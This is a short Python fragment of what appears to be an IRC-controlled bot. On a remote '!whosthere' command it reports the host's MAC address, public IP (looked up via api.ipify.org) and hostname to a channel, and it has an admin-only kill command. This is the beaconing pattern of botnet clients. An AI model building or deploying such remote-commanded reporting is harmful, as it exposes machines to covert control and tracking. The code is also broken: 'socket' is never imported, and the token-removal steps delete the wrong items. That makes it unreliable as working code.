import re, uuid
from requests import get

def send(sock,type,channel,msg):
	sock.send(bytes(type + " " + channel + " :" + msg + "\n","UTF-8"))

def handle(chunk,channel,botname,sock,exitcode,adminname):
	if chunk[2] == channel or chunk[2] == botname:
            
                    first = chunk[0]
                    ch = chunk[2]
                    chunk.remove(chunk[0])
                    chunk.remove(chunk[1])
                    chunk.remove("PRIVMSG")

                    name = first[first.find(":")+1:first.find("!")]
                    print("<" +  name + "> " + " ".join(chunk)[1:])





                    if chunk[0] == ":!" + exitcode and name == adminname:
                        sock.close()

                    if chunk[0] == ":!whosthere":
                        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
                        send(sock,"PRIVMSG",channel,"I_AM: " + mac + " " + get('https://api.ipify.org').text + " " + socket.gethostname())
                        
